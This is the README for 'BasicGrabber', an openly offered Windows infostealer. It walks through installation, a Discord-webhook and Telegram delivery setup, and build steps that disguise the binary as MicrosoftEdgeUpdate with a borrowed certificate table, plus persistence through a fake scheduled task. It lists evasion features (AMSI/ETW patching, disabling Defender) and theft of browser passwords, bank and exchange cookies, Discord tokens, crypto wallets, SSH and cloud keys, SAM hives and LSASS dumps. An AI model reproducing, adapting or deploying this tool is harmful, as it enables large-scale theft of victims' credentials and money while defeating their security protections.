BasicGrabber-Tool
v1.0 — first public release

A local collection tool for credentials, sessions, and telemetry. Made for labs and authorized audits. It runs without a console window, hides itself, disarms Defender, encrypts everything it collects, and delivers it through a Discord webhook and/or a Telegram bot.

Author: lsdbroh · License: MIT

Table of contents
What it is
What exactly it collects
Requirements
Installation
Setup
Usage
Command-line flags
Modules and --only / --skip
Delivery format
Building to .exe
Persistence and self-delete
Troubleshooting
Known limitations
What it does NOT do
Code structure
Changelog
Credits and license
1. What it is
BasicGrabber is a single Python script. You run it on a Windows machine that is already compromised, or on a lab computer. It gives you back everything an analyst needs to move further: active sessions, saved credentials, system configuration, network surface, defenses present, and visual evidence.

It is built around four priorities:

Silence. No console, no prints, no windows. Only one instance runs at a time (mutex), the working folder is hidden in %LOCALAPPDATA%, and the only output goes out over the network.
Survival. Before it touches anything, it patches AmsiScanBuffer and EtwEventWrite inside its own process, hides its threads from the debugger, and resolves the exports of ntdll/kernel32 at runtime so it can skip IAT hooks.
Adaptation. If it finds Defender, it disarms it (exclusions, real-time, IOAV, behavior, ASR, MAPS, CFA). If there is no Defender, it assumes something worse is watching, so it lowers concurrency, adds jitter, and raises the collection limits.
Clean delivery. Everything is encrypted with AES-GCM in memory, the key travels in a separate message, and the package is uploaded as an attachment. No part of the payload is ever written to disk.
Every child process is started with CreateProcessW using a fake parent (explorer.exe) and the mitigation policy BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON, which the kernel applies to the whole process tree.

2. What exactly it collects
Everything below is sent organized into panels. When a panel finds nothing, it is clearly marked with No data found regarding <topic> instead of being left empty.

System and hardware
Hostname, user, domain, OS, build and UBR, registered owner, install date.
Elevation (admin), local IP, MAC, detected virtualization, uptime, PID, CWD.
CPU, cores, RAM, GPU, disks and free space, monitors and resolution, battery, TPM, Secure Boot, BIOS and date, motherboard, serial number.
Windows product key decoded from the registry, plus BitLocker recovery keys.
Relevant environment variables, clipboard, and the list of installed software.

Network
Public IP with city, region, country, organization, and ASN.
Interfaces, gateway, DNS cache, ARP table, SMB shares, and mapped drives.
Listening ports and a quick scan against localhost and the gateway.
A posture audit scored 0–100: SMBv1, SMB signing, RDP, UAC, LSA, autologon, WinRM, accounts without a password, outdated build, IFEO, and exposed services.

Defenses
Antivirus products via SecurityCenter2, plus known EDR processes.
Defender status: real-time, behavior, IOAV, tamper protection, version, and signature age.
Active ASR rules, SmartScreen, VBS, HVCI, Credential Guard, LSA PPL, firewall per profile.
Existing antivirus exclusions (paths, processes, extensions) and the result of the disarming that was applied.

Accounts and persistence
Local users, Administrators members, active sessions, and last logon.
Run/RunOnce keys in HKCU and HKLM, non-Microsoft scheduled tasks, non-Microsoft services, the Startup folder, Winlogon (Shell/Userinit/Taskman/AppSetup), and WMI subscriptions.

Browsers
Every profile of Chrome, Chrome Beta, Chrome SxS, Brave, Edge, Opera, Opera GX, Vivaldi, Yandex, Chromium, and Arc.
Decrypted cookies from more than 55 services (Roblox, YouTube, Google, Gmail, X/Twitter, Instagram, Facebook, TikTok, Steam, GitHub, GitLab, Twitch, Spotify, Netflix, Disney+, Amazon, eBay, PayPal, Binance, Coinbase, Kraken, Bybit, OKX, KuCoin, Discord, Epic, Riot, Battle.net, Reddit, LinkedIn, Microsoft, Dropbox, Mega, Proton, Yandex, VK, Xbox, PlayStation, Nintendo, Ubisoft, EA, GOG, Cloudflare, DigitalOcean, Heroku, Vercel, AWS, Azure, Grafana, Atlassian, Shopify, AliExpress, MercadoLibre).
Cookies from more than 130 banks (Chase, Bank of America, Wells Fargo, Citi, HSBC, Barclays, Santander, BBVA, CaixaBank, N26, Revolut, ING, Deutsche Bank, UBS, Bradesco, Itaú, Nubank, Bancolombia, Banorte, BCP, Galicia, Mercado Pago, and the rest of the list), prioritizing session cookie names.
Saved credentials from Login Data with decrypted username and password, plus logins.json and key4.db from Firefox.
History, bookmarks, extensions, downloads, and profile accounts.

Sessions
Discord tokens from stable, canary, PTB, development, the Microsoft Store package, and all forks (Vencord, BetterDiscord, Lightcord, Dorion, ArmCord, WebCord, Ripcord), plus any found in browser storage.
API enrichment: profile, email, phone, connections, guilds, relationships, billing, Nitro, and gift codes.
JWT, bearer, Slack, GitHub, AWS, and Stripe tokens in caches of Slack, Teams, Element, Notion, Figma, Postman, Insomnia, Obsidian, VS Code, WhatsApp, and Signal.
Riot Client artifacts, ssid/clid/csid/tdid cookies, and a live dump from the LCU (summoner, PUUID, level, wallet).

Wallets and finance
Vaults from 16 wallet extensions (MetaMask, Phantom, Keplr, Coinbase, Trust, TronLink, Petra, Rabby, Solflare, Backpack, XDEFI, Coin98, Brave Wallet, Nami, Yoroi).
Ethereum/Geth JSON keystores, and files from Exodus, Electrum, Atomic, Bitcoin Core, Monero, Litecoin, and Solana.
Mnemonic seeds detected in plain text, BTC/ETH addresses, credit cards from autofill, and IBANs and cards (with Luhn validation) pulled from documents.

Contacts and files
Emails and phones from the Discord profile, from autofill, and from documents.
SSH keys, .aws/credentials, .azure, .kube/config, .docker/config.json, .npmrc, .pypirc, .netrc, .git-credentials, .env, and wp-config.php.
Password managers (KeePass .kdbx, Bitwarden, 1Password, NordPass, KeePassXC, Dashlane).
Remote access (TeamViewer, AnyDesk, RustDesk, .rdp files), VPN configs (WireGuard, OpenVPN), and Thunderbird profiles.

Clients
RobloxCookies in LocalStorage, ssfn* files and loginusers.vdf from Steam, Telegram tdata, Minecraft accounts, FileZilla recentservers.xml/sitemanager.xml, WinSCP.ini, and PuTTY sessions.

Dumps
SAM, SYSTEM, and SECURITY hives compressed (requires admin) for offline cracking.
DPAPI blobs from Microsoft\Protect and Credential Vault files.
LSASS dump compressed with --lsass (requires admin).

Visual evidence
Five full PNG screenshots taken in memory at key moments, without touching the disk.

3. Requirements
Item	Detail
Operating system	Windows 10 / 11 / Server 2019+. Linux and macOS work partially (no registry, DPAPI, hives, or LCU).
Python	3.9 minimum. 3.11 or 3.12 recommended for PyInstaller compatibility. Avoid 3.13+ and 3.15 for building: PyInstaller still has problems.
Privileges	A normal user is enough. Admin is recommended: without admin there are no hives, no LSASS, no Defender disarming, no exclusions, and no BitLocker keys.
Architecture	x64.
Network	HTTPS outbound to discord.com and api.telegram.org.
Mandatory dependencies	None. The script runs on the standard library.
Recommended dependencies	cryptography (real AES-GCM) and psutil (hardware and process profiling).
Without cryptography, encryption falls back to a keystream derived from SHA-256 with zlib — it works, but it is weaker. Without psutil, you lose RAM, disks, processes, and battery.

4. Installation
1. Prepare Python

Download Python 3.11 or 3.12 from python.org and check "Add python.exe to PATH" during setup.

Verify:

powershell
python --version
pip --version
2. Get the script

powershell
git clone https://github.com/lsdhub/BasicGrabber-Tool.git
cd BasicGrabber-Tool
Or just download BasicGrabber.py on its own. It is a single file and needs nothing else from the repo.

3. Install the recommended dependencies

powershell
pip install cryptography psutil
4. (Optional) Build dependencies

powershell
pip install pyinstaller
5. Set up the delivery channel

Open BasicGrabber.py and fill in the first three constants:

python
WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/YYYY"
TELEGRAM_TOKEN = ""
TELEGRAM_CHAT = ""
To create the Discord webhook: in your server → Channel settings → Integrations → Webhooks → New webhook → Copy webhook URL.

To create the Telegram bot: talk to @BotFather, send /newbot, copy the token. Then send /start to your bot and leave TELEGRAM_CHAT empty: the script works out the chat_id by itself by reading getUpdates.

If you don't want a webhook, use an empty string. If you don't want Telegram, leave the token empty. With both empty, the script collects but delivers nothing.

5. Usage
Direct run

powershell
python BasicGrabber.py
Silent, but it keeps the console alive until it finishes. To see progress:

powershell
python BasicGrabber.py --verbose
Invisible run

powershell
pythonw BasicGrabber.py
pythonw opens no console. This is the right way to launch it by hand without anything showing.

Typical lab run

powershell
# full collection with persistence and an LSASS dump
BasicGrabber.exe --persist --lsass

# with a random delay of up to 90 seconds
BasicGrabber.exe --delay 90

# only sessions and cookies, without touching the network or screenshots
BasicGrabber.exe --only discord,cookies,logins --no-shots
Result

The script prints nothing and leaves no files. Everything arrives at your webhook as several messages with embeds and an encrypted attachment, followed by a message with the AES key. On Telegram you get a summary, the key, and the document.

6. Command-line flags
Flag	Effect
--verbose	Writes progress to the console.
--delay N	Sleeps a random time between 0 and N seconds before starting.
--no-shots	Turns off screenshots.
--no-forge	Does not fake PE metadata and does not relaunch from the copy.
--no-evade	Does not patch AMSI/ETW and does not disarm Defender.
--lsass	Dumps LSASS (requires admin).
--quiet	Lowers concurrency and adds pauses between modules.
--persist	Installs a scheduled task MicrosoftEdgeUpdateTaskMachineUA2 at logon.
--unpersist	Deletes that task and exits without collecting.
--self-delete	Deletes the binary after delivery.
--only a,b,c	Runs only the listed modules (evasion always stays on).
--skip a,b,c	Skips the listed modules.
7. Modules and --only / --skip
The valid names for --only and --skip are:

evasion, defenses, system, network, audit, discord, sessions, cookies,
browser, logins, wallets, financial, contacts, documents, vaults,
clients, riot, artifacts, lsass, screenshots
You can also turn modules off permanently by editing the FEATURES dictionary at the top of the file:

python
FEATURES = {
    "network": False,      # don't scan ports
    "lsass": True,         # dump LSASS by default
    "screenshots": False,  # no screenshots
    ...
}
8. Delivery format
Metadata goes in embeds grouped 5 at a time, with a budget of 5200 characters per message.
The full package is a serialized JSON, encrypted with AES-GCM (BG2), or with a SHA-256 + zlib keystream (BG1) if cryptography is missing.
The key goes in a separate message with the prefix AES key: or key:.
If the attachment goes over ~7.4 MB, screenshots are dropped first, then loose history and cookies, until it fits.
If the webhook answers 413, the package is re-sent split into base64 chunks.
Retries use exponential backoff: 6 attempts, base 1.5 s, ceiling 45 s, random jitter. Codes 400, 401, 403, 404, and 413 are not retried.
Telegram accepts up to 50 MB, so it rarely needs chunking.

9. Building to .exe
powershell
pip install pyinstaller
pyinstaller --onefile --noconsole --name MicrosoftEdgeUpdate BasicGrabber.py
To add your own icon and metadata:

powershell
pyinstaller --onefile --noconsole --name MicrosoftEdgeUpdate --icon icon.ico --version-file version.txt BasicGrabber.py
When run compiled and without --no-forge, the binary copies itself to %LOCALAPPDATA%\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe, injects a Microsoft VERSIONINFO, an asInvoker manifest, and a certificate table taken from a signed system executable, then relaunches from there. The signature does not validate cryptographically, but the publisher name resolves and the binary stops looking anonymous.

PyInstaller binaries weigh between 8 and 15 MB. If the antivirus eats it, build with --onedir and ship the folder.

10. Persistence and self-delete
powershell
BasicGrabber.exe --persist
Creates the scheduled task MicrosoftEdgeUpdateTaskMachineUA2 with an onlogon trigger and limited level. To remove it:

powershell
BasicGrabber.exe --unpersist
To make it delete itself after delivery:

powershell
BasicGrabber.exe --self-delete
It launches a detached cmd that waits 5 seconds and then executes the delete on the binary. Only works with the compiled executable, not with the .py.

11. Troubleshooting
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe0
Fixed in v1.1. Windows console tools output in the OEM code page, not UTF-8. If you are on v1.0, update. In v1.1 every subprocess capture is in bytes and is decoded by trying utf-8, cp850, cp1252, and mbcs before falling back to latin-1.

The webhook receives nothing
Check that the URL is complete and has no spaces. Open the URL in a browser: it should return a Discord error JSON (that means it exists). Check that the channel's webhook hasn't been deleted.

Discord error 413
The attachment is over the server limit. The script already chunks into base64 as a backup, but if the channel has a reduced limit, lower WEBHOOK_SOFT_LIMIT in the code.

Telegram doesn't send
The chat_id is missing. Send /start to the bot before launching, or put the numeric chat_id manually in TELEGRAM_CHAT.

The antivirus blocks the .exe
Build with --onedir, add your own icon and metadata, or run it from Python instead of a binary. With admin, the script adds its own exclusions on start, but the first run is always the exposed one.

Chrome cookies come out empty
Chrome 127 and higher use App-Bound Encryption (v20), which does not decrypt with user DPAPI alone. Discord tokens still come out because they go through LevelDB with DPAPI. For cookies you need Chrome older than 127, or extract the key from the Local State file with the elevated service key.

No hives or LSASS
Missing elevation. Run as administrator.

LSASS too big in the notes
The compressed dump goes over 6 MB. Lower the dump quality or raise LSASS_CAP.

The package arrives without screenshots
The automatic size trimming dropped them. Use --no-shots and upload the screenshots separately, or lower your screen resolution.

Two runs at the same time
The mutex Global\MicrosoftEdgeUpdateSvc_d18 makes the second one exit without doing anything. That is intended.

12. Known limitations
Linux and macOS only cover system, network, browsers, and cookies. No registry, DPAPI, hives, LCU, or GDI screenshots.
The faked binary signature does not validate; it only adds a publisher name and a description.
Comsvcs.dll can fail on LSASS if there is an EDR with aggressive PPL protection.
Without cryptography, the encryption is weaker.
Panels are trimmed to 25 fields and 1000 characters per field.
Seeds detected by regex can include false positives.
13. What it does NOT do
It does not inject into other processes.
It does not change system startup outside the optional scheduled task.
It does not brute-force or decrypt wallet or password-manager passwords: it delivers the encrypted artifacts so you can work them outside.
It does not exfiltrate full files, only the small ones in base64 and the hives.
It does not clean Windows events or logs.
It does not update itself.
14. Code structure
A single file, organized into classes with one responsibility each:

Crypto, Native, Spawn, Win, Forge       infrastructure and evasion
Browsers, Discord, Sessions, Cookies    browsers and sessions
Logins, Autofill, Wallets, Financial    credentials and money
Contacts, Documents, Vaults, Clients    files and clients
Riot, Network, Defenses, Audit          games, network, and posture
SystemInfo, Accounts, Persistence       system
Artifacts, BrowserData, Screen          dumps and screenshots
Exfil, Present, Runner                  delivery and orchestration
Places to adapt:

FEATURES — turn modules on or off.
Cookies.TARGETS — add a service with ("domain.com", {"cookie_name"}).
Cookies.BANKS — add a bank with "alias": "domain.com".
Wallets.EXT and Wallets.FILES — add wallets.
Present.build — add or remove panels.
WEBHOOK_URL, TELEGRAM_TOKEN, TELEGRAM_CHAT — delivery channel.
15. Changelog
v1.0 — first release
Full pipeline for reconnaissance, credentials, sessions, wallets, and screenshots.
Evasion: AMSI and ETW patch, thread hiding, fake parent, non-Microsoft binary blocking policy.
Defender disarming with exclusions and disabling of real-time, behavior, IOAV, scripting, files, and CFA.
Automatic aggressive mode when there is no Defender.
More than 130 banks and 55 services in the cookie collector.
Hive, DPAPI, Credential Vault, and LSASS dumps.
AES-GCM payload encryption with a separate key and size-limit chunking.
Explicit No data found regarding X marker in empty panels.

v1.1
Fixed UnicodeDecodeError in every subprocess capture.
Spawn.run now captures the real output with a pipe, a timeout, and TerminateProcess.
Virtualization detection via the registry instead of systeminfo.

16. Credits and license
MIT. Use it, change it, and redistribute it freely, keeping the authorship notice.

Made by lsdbroh.

